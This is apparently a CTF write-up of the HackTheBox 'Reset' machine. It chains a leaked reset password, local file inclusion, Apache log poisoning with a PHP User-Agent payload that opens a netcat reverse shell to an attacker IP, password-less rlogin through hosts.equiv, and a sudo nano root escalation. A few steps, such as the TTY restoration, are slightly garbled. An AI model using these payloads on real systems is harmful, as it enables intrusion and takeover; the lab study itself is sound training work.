# HackTheBox Reset — Easy Linux Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Reset-brightgreen?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-RCE%20%26%20PrivEsc-yellow?style=for-the-badge)

> **HackTheBox Reset** is an Easy-difficulty Linux-based machine focused on web application exploitation, log poisoning, rsh protocol abuse, hosts.equiv bypass, and nano editor privilege escalation.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [Web Application Enumeration](#web-application-enumeration)
- [Admin Login Panel Discovery](#admin-login-panel-discovery)
- [Password Reset Vulnerability](#password-reset-vulnerability)
- [Local File Inclusion](#local-file-inclusion)
- [Apache Log Poisoning](#apache-log-poisoning)
- [Reverse Shell Establishment](#reverse-shell-establishment)
- [Shell Stabilization](#shell-stabilization)
- [User Flag Retrieval](#user-flag-retrieval)
- [Hosts.Equiv Exploitation](#hostsequiv-exploitation)
- [RSH Protocol Abuse](#rsh-protocol-abuse)
- [Privilege Escalation via Nano](#privilege-escalation-via-nano)
- [Root Access and Flag Retrieval](#root-access-and-flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Reset |
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **Operating System** | Linux (Ubuntu) |
| **Target IP** | `10.129.234.130` |
| **Primary Services** | SSH (22), HTTP (80), rexecd (512), rlogin (513), rshd (514) |
| **Web Server** | Apache httpd 2.4.52 |
| **SSH Version** | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 |
| **Initial Access** | Log poisoning via LFI |
| **Exploitation Method** | Apache log injection + reverse shell |
| **Privilege Escalation** | hosts.equiv + rsh + nano editor exploit |
| **Tools** | Nmap, curl, netcat, Python, nano, rsh-client |

---

## 🚀 Initial Nmap Enumeration

Today we are back with another **HackTheBox Easy-difficulty machine**, this time enumerating and exploiting the Linux-based machine named **Reset**.

We have the target IP:

```
10.129.234.130
```

Starting with a comprehensive all-port scan to identify all exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.234.130
```

**Result:**

```
Nmap scan report for 10.129.234.130
Host is up, received echo-reply ttl 63 (0.26s latency).
Scanned at 2026-09-28 23:01:25 EDT for 287s
Not shown: 65530 closed tcp ports (reset)

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
512/tcp open  exec    syn-ack ttl 63
513/tcp open  login   syn-ack ttl 63
514/tcp open  shell   syn-ack ttl 63
```

Five interesting ports were discovered:

- `22/tcp` — SSH (Secure Shell)
- `80/tcp` — HTTP (Web Server)
- `512/tcp` — rexecd (Remote Execution)
- `513/tcp` — rlogin (Remote Login)
- `514/tcp` — rshd (Remote Shell)

The presence of **rsh services** (512, 513, 514) is unusual and reveals legacy remote access protocols! 🎯

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p22,80,512,513,514 10.129.234.130
```

**Result:**

```
Nmap scan report for 10.129.234.130
Host is up, received reset ttl 63 (0.26s latency).
Scanned at 2026-09-28 23:06:41 EDT for 57s

PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
|   256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)

80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Admin Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

512/tcp open  exec    syn-ack ttl 63 netkit-rsh rexecd
513/tcp open  login?  syn-ack ttl 63
514/tcp open  shell   syn-ack ttl 63 Netkit rshd

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings:

✔️ **HTTP:** Apache 2.4.52 with **Admin Login** panel  
✔️ **SSH:** OpenSSH 8.9p1 — Modern version  
✔️ **RSH Services:** netkit-rsh (rexecd, rlogin, rshd) — **Legacy protocols**  
✔️ **Cookie Issue:** PHPSESSID lacks httponly flag  
✔️ **Session Management:** PHP-based application  

The presence of legacy rsh services indicates this machine will involve **protocol-based privilege escalation**!

---

## 🌐 Web Application Enumeration

### Admin Login Panel

Accessing the web server on port 80:

```
http://10.129.234.130/
```

**Page Content:**
- Admin Login panel
- Username field
- Password field
- Login button
- Password Reset link

**Initial Observations:**
- Simple web application
- PHP-based session management (PHPSESSID cookie)
- Typical authentication form
- Password reset functionality available

---

## 🔐 Admin Login Panel Discovery

### Testing Default Credentials

```bash
curl -X POST http://10.129.234.130/ \
  -d "username=admin&password=admin"
```

**Result:** No feedback from fake credentials.

### Password Reset Functionality

Instead of brute-forcing, let's test the password reset feature:

```bash
curl -X POST http://10.129.234.130/reset.php \
  -d "username=admin"
```

This reveals a critical vulnerability in the password reset implementation!

---

## 🎯 Password Reset Vulnerability

### Exploiting Insecure Password Reset

Accessing the password reset feature and entering "admin":

```
POST /reset.php
username=admin
```

### Critical Vulnerability Discovery

The server responds with the reset password in **plain text**:

```json
{
  "username": "admin",
  "new_password": "404794cb",
  "timestamp": "2026-09-29 03:13:26"
}
```

**Critical Security Issues:**

1. ⚠️ **Password exposure in response** — Should never reveal passwords
2. ⚠️ **No encryption** — Password transmitted and stored unencrypted
3. ⚠️ **Unencrypted JSON** — Sensitive data in plaintext
4. ⚠️ **Timestamp leaked** — Server time information disclosed

This is a **catastrophic security failure** in password management!

**Credentials Obtained:**
- **Username:** admin
- **Password:** 404794cb

We could login directly, but let's explore the vulnerability further...

---

## 📂 Local File Inclusion

### Discovering LFI Vulnerability

After exploring the admin panel, we discover a **file parameter** that processes file paths:

```
http://10.129.234.130/?file=index.php
```

This appears to include files from the system!

### Testing LFI Payloads

Testing common LFI paths:

```
http://10.129.234.130/?file=/etc/passwd
http://10.129.234.130/?file=/etc/hosts
http://10.129.234.130/?file=../../etc/passwd
```

**LFI Confirmed!** We can read arbitrary files from the system.

### Reading Apache Logs

The most useful file for our exploitation is the **Apache access log**:

```
http://10.129.234.130/?file=/var/log/apache2/access.log
```

This log contains **all HTTP requests** made to the server, including our requests!

This opens the door to **log poisoning**!

---

## 💉 Apache Log Poisoning

### Understanding Log Poisoning

**Log poisoning attack chain:**

1. Make an HTTP request with **PHP code in the User-Agent header**
2. Apache logs this request (including our PHP code)
3. Use LFI to access the log file
4. The PHP code in the log is **executed by the PHP interpreter**
5. We achieve **remote code execution**

### Crafting the Poison

We inject a reverse shell payload in the User-Agent:

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.95 9090>/tmp/f'); ?>
```

### Sending the Poisoned Request

```bash
curl -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.95 9090>/tmp/f'); ?>" \
  http://10.129.234.130/
```

**Payload Breakdown:**

| Component | Purpose |
|-----------|---------|
| `rm /tmp/f` | Clean up any existing FIFO |
| `mkfifo /tmp/f` | Create a named pipe |
| `cat /tmp/f` | Read from the pipe |
| `/bin/sh -i` | Interactive shell |
| `nc 10.10.15.95 9090` | Connect to our listener |
| `>/tmp/f` | Redirect output to pipe |

### Executing the Poison

Now access the Apache log file via LFI to trigger PHP execution:

```
http://10.129.234.130/?file=/var/log/apache2/access.log
```

When Apache logs parse the poisoned entry, our PHP code executes!

---

## 🔌 Reverse Shell Establishment

### Setting Up Listener

On your attacking machine:

```bash
nc -lvnp 9090
```

**Listener Output:**

```
Listening on 0.0.0.0 9090
Connection received on 10.129.234.130 46930
/bin/sh: 0: can't access tty; job control turned off
$
```

✅ **Reverse shell established!**

### Verifying Access

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

**Privilege Level:** www-data (web server user)

We have command execution as the www-data user!

---

## 🛠️ Shell Stabilization

### Checking for Python

```bash
which python3
/usr/bin/python3
```

Python3 is available for shell upgrade!

### Upgrading to Interactive Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### TTY Restoration

```bash
www-data@reset:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 9090

stty raw -echo
nc -lvnp 9090

www-data@reset:/var/www/html$
```

✅ **Fully interactive shell achieved!**

---

## 📄 User Flag Retrieval

### Exploring the File System

```bash
ls /home/
sadm
```

A user named `sadm` exists!

### Reading User Flag

```bash
cd /home/sadm
ls
user.txt
cat user.txt
[USER FLAG CONTENT]
```

✅ **User flag retrieved!**

---

## 🔐 Hosts.Equiv Exploitation

### Understanding hosts.equiv

The `/etc/hosts.equiv` file is a legacy authentication mechanism that:
- Lists hosts and users granted "trusted" remote command access
- Bypasses password authentication for specified users
- Used by rsh/rlogin protocols
- Major security risk in modern systems

### Reading hosts.equiv

```bash
cat /etc/hosts.equiv
# /etc/hosts.equiv: list of hosts and users that are granted "trusted"
#                   command access to your system.
- root
- local
+ sadm
```

**Critical Discovery:**

```
+ sadm
```

The `sadm` user is listed as a **trusted remote user**!

This means if we can:
1. Create a `sadm` user on our attacking machine
2. Connect via rlogin from our machine
3. We will be **automatically authenticated as sadm** on the target!

### Creating Sadm User Locally

On your attacking machine (Parrot/Kali):

```bash
sudo useradd sadm
sudo passwd sadm
# Set any password
```

---

## 🔌 RSH Protocol Abuse

### Installing RSH Client

The rsh-client package may not be installed by default:

```bash
wget -qO /tmp/rsh-client.deb http://deb.debian.org/debian/pool/main/n/netkit-rsh/rsh-client_0.17-24_amd64.deb
dpkg -i /tmp/rsh-client.deb
```

### Connecting via Rlogin

Using the legacy rlogin protocol:

```bash
rlogin -l sadm 10.129.234.130
```

**Result:**

```
sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
sadm@reset:~$
```

✅ **Remote login as sadm achieved without password!**

### How It Worked

1. Rlogin connected to port 513 (rlogin service)
2. Sent authentication: user `sadm` from host with `sadm` user
3. Server checked `/etc/hosts.equiv`
4. Found `+ sadm` entry
5. Granted **trusted access** without password prompt
6. Authenticated as sadm user

This is a **classic hosts.equiv bypass** using rsh protocols!

---

## 🎯 Privilege Escalation via Nano

### Checking Sudo Privileges

```bash
sudo -l
```

**Sudo Configuration:**

```
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin,
    use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

### Critical Finding

The `sadm` user can run `/usr/bin/nano /etc/firewall.sh` with sudo!

**Nano Editor Privilege Escalation:**

The nano text editor has a command execution feature that allows running shell commands while editing!

### Exploiting Nano

While editing in nano:

1. Press `CTRL+R` — Read file/command mode
2. Press `CTRL+X` — Execute command mode
3. Type: `reset; sh 1>&0 2>&0` — Reset terminal and spawn shell
4. Press `ENTER` — Execute

This spawns a **shell with root privileges** because we're running nano as root!

### Detailed Exploitation Steps

```bash
sudo /usr/bin/nano /etc/firewall.sh
```

**Inside nano:**

```
CTRL+R     # Read/execute mode
CTRL+X     # Command execution
reset; sh 1>&0 2>&0
ENTER
```

**Result:**

```
uid=0(root) gid=0(root) groups=0(root)
root@reset:~#
```

✅ **Root shell obtained!**

---

## 👑 Root Access and Flag Retrieval

### Navigating to Root Directory

```bash
cd /root
ls
```

**Output:**

```
root_279e22f8.txt  snap
```

The root flag has a unique filename (likely randomized)!

### Reading Root Flag

```bash
cat root_279e22f8.txt
[ROOT FLAG CONTENT]
```

✅ **Root flag retrieved!**

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │   HackTheBox Reset   │
                    │   10.129.234.130     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Nmap Enumeration   │
                    │ 5 Ports Discovered   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Service Detection    │
                    │ RSH Services Found   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Web App Enumeration  │
                    │ Admin Login Panel    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Password Reset Vuln  │
                    │ Plaintext Exposure   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ LFI Discovery        │
                    │ File Parameter Found │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Apache Log Access    │
                    │ Via LFI              │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Log Poisoning        │
                    │ PHP Code Injection   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Reverse Shell        │
                    │ www-data Access      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Shell Stabilization  │
                    │ TTY Upgrade          │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ User Flag Retrieved  │
                    │ /home/sadm/user.txt  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ hosts.equiv Analysis │
                    │ sadm User Listed     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ RSH Client Install   │
                    │ rlogin Setup         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Rlogin Connection    │
                    │ Sadm User Access     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Sudo Privilege Check │
                    │ Nano Edit Allowed    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Nano Editor Exploit  │
                    │ CTRL+R + CTRL+X      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root Shell Spawned   │
                    │ UID 0 Access         │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root Flag Retrieved  │
                    │ /root/root_*.txt     │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. Legacy Protocols Are Dangerous

RSH/rlogin services are legacy protocols that should be disabled:
- No encryption
- Weak authentication (hosts.equiv)
- Often misconfigured
- Modern alternatives (SSH) should replace them

**Always audit and disable legacy services.**

### 2. Hosts.Equiv Is a Security Risk

The `/etc/hosts.equiv` file provides automatic authentication:
- Bypasses password requirements
- One misconfiguration grants access
- Rarely updated or audited
- Should be avoided in modern systems

**Use SSH keys with specific restrictions instead.**

### 3. LFI Leads to Log Poisoning

Local File Inclusion vulnerabilities enable:
- Reading sensitive files (/etc/passwd, logs, configs)
- Log poisoning (injecting PHP code into logs)
- Information gathering
- Remote code execution

**Validate all file paths and implement proper access controls.**

### 4. Password Reset Vulnerabilities

Insecure password reset implementations leak:
- Credentials in responses
- Unencrypted transmission
- Plaintext storage
- Timing information

**Never transmit or expose passwords after reset.**

### 5. Nano Editor Can Execute Commands

The nano text editor has command execution features:
- `CTRL+R` for read/execute mode
- `CTRL+X` for command execution
- Dangerous when running as root via sudo

**Restrict sudo access to specific trusted applications.**

### 6. Cookie Security Flags Matter

The PHPSESSID cookie lacks httponly flag:
- Can be accessed via JavaScript
- Vulnerable to XSS attacks
- Should always have httponly set

**Always set httponly and secure flags on session cookies.**

### 7. File Parameter Vulnerabilities

File parameters in URLs should never process system paths:
- Always validate and sanitize input
- Implement whitelist of allowed files
- Never allow traversal sequences

**Use proper file inclusion frameworks and validation.**

### 8. Log Poisoning via User-Agent

HTTP headers are logged by default:
- User-Agent is user-controlled
- Apache logs User-Agent values
- Can inject PHP code into logs
- Logs are often included in applications

**Sanitize log output and validate file access.**

### 9. Shell Stabilization Is Critical

Initial reverse shells are often basic:
- No arrow keys
- No tab completion
- No job control
- Unstable connections

**Always upgrade to interactive shells for better usability.**

### 10. Privilege Escalation Chains

Complete root access required multiple steps:
1. RCE via log poisoning
2. User escalation via hosts.equiv
3. Root escalation via nano editor

**Real-world exploitation often involves chaining multiple vulnerabilities.**

---

## 🛠️ Tools Used

| Tool | Purpose | Usage |
|------|---------|-------|
| **Nmap** | Port scanning and service enumeration | Multi-port service detection |
| **curl** | HTTP requests and exploitation | Log poisoning payload delivery |
| **netcat (nc)** | Reverse shell listener | 9090 listener for shell |
| **Python3** | Shell upgrade utility | pty.spawn for interactive shell |
| **rsh-client** | RSH protocol client | rlogin connection |
| **nano** | Text editor privilege escalation | CTRL+R CTRL+X command execution |
| **Linux Shell** | Command execution | Post-exploitation access |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.234.130
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p22,80,512,513,514 10.129.234.130
```

### Test Password Reset

```bash
curl -X POST http://10.129.234.130/reset.php \
  -d "username=admin"
```

### Craft Log Poisoning Payload

```bash
curl -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.95 9090>/tmp/f'); ?>" \
  http://10.129.234.130/
```

### Trigger Log Poisoning via LFI

```bash
curl "http://10.129.234.130/?file=/var/log/apache2/access.log"
```

### Set Up Reverse Shell Listener

```bash
nc -lvnp 9090
```

### Upgrade Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Create Local Sadm User

```bash
sudo useradd sadm
sudo passwd sadm
```

### Install RSH Client

```bash
wget -qO /tmp/rsh-client.deb http://deb.debian.org/debian/pool/main/n/netkit-rsh/rsh-client_0.17-24_amd64.deb
dpkg -i /tmp/rsh-client.deb
```

### Connect via Rlogin

```bash
rlogin -l sadm 10.129.234.130
```

### Check Sudo Privileges

```bash
sudo -l
```

### Exploit Nano Editor

```bash
sudo /usr/bin/nano /etc/firewall.sh
# Inside nano: CTRL+R, CTRL+X, then: reset; sh 1>&0 2>&0
```

### Read Flags

```bash
cat /home/sadm/user.txt
cat /root/root_*.txt
```

---

## 🎬 Final Attack Path

```
Port Scan (5 Open Ports)
      ↓
Identify Web App (Port 80)
      ↓
Identify RSH Services (512, 513, 514)
      ↓
Discover Admin Login
      ↓
Test Password Reset
      ↓
Extract Admin Credentials (Plaintext)
      ↓
Discover LFI Vulnerability (file parameter)
      ↓
Access Apache Logs via LFI
      ↓
Craft Log Poisoning Payload (PHP Code)
      ↓
Inject Payload via User-Agent
      ↓
Execute via Apache Log Access
      ↓
Reverse Shell (www-data)
      ↓
Shell Stabilization
      ↓
User Flag Retrieved
      ↓
Read /etc/hosts.equiv
      ↓
Create Local Sadm User
      ↓
Install RSH Client
      ↓
Connect via Rlogin (Password-less)
      ↓
Authenticated as Sadm User
      ↓
Check Sudo Privileges
      ↓
Exploit Nano Editor (CTRL+R CTRL+X)
      ↓
Root Shell Spawned
      ↓
Root Flag Retrieved
```

---

## 🏁 Conclusion

The **HackTheBox Reset** machine demonstrates multiple critical vulnerabilities:

1. **Insecure Password Management** — Passwords in plaintext
2. **Local File Inclusion** — Arbitrary file access
3. **Log Poisoning** — PHP execution via logs
4. **Legacy Protocol Vulnerabilities** — RSH/hosts.equiv bypass
5. **Application Privilege Escalation** — Nano editor exploitation

### Most Important Lessons:

✔️ Never hardcode or expose credentials  
✔️ Validate all file parameters rigorously  
✔️ Disable legacy services (RSH, rlogin)  
✔️ Audit and remove hosts.equiv entries  
✔️ Restrict sudo to specific commands  
✔️ Set proper cookie security flags  
✔️ Log poisoning is a powerful RCE technique  
✔️ Chain multiple vulnerabilities for root access  
✔️ Always upgrade shells to interactive mode  
✔️ Legacy configurations create security gaps  

**The final result was complete system compromise with both user and root flags successfully retrieved through multiple exploitation chains.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [RSH Protocol Security](https://en.wikipedia.org/wiki/Remote_Shell)
- [Hosts.Equiv Security Risks](https://linux.die.net/man/5/hosts.equiv)
- [Log Poisoning Attack Guide](https://www.owasp.org/index.php/Log_Poisoning)
- [Nano Editor Commands](https://www.nano-editor.org/docs.php)
- [PHP LFI Vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

---

## 📚 Further Reading

- **Web Application Vulnerabilities:** Study LFI, authentication bypass, and file inclusion techniques
- **Legacy Protocol Security:** Research RSH, rlogin, telnet vulnerabilities
- **System Misconfiguration:** Learn about dangerous files like hosts.equiv, .rhosts, and sudoers
- **Privilege Escalation:** Master application-based privesc through text editors and interpreters
- **Log Poisoning Techniques:** Deep dive into log injection and PHP execution vectors

---

**Last Updated:** 2026-09-29  
**Author:** Naval
**Status:** ✅ Machine Compromised - Root Level Access Achieved
